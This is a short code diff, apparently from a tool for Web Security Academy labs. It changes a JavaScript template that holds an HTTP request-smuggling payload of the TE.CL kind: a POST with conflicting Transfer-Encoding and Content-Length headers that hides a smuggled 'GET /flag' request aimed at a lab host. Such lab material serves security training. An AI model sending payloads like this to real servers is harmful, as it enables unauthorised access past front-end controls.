@@ -40,21 +40,18 @@ Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net
 
 `
 
-const teclTemplate = `GET / HTTP/1.1
+const teclTemplate = `POST / HTTP/1.1
+Host: 0a0d00d40336daa38033173400be001a.web-security-academy.net
 Transfer-Encoding: chunked
 Content-Length: 4
 
 28
 GET /flag HTTP/1.1
-Content-Length: 71
+Content-Length: 75
 
 0
 
 GET / HTTP/1.1
-Content-Length: 5
-Transfer-Encoding: chunked
-
-0
 
 `
 
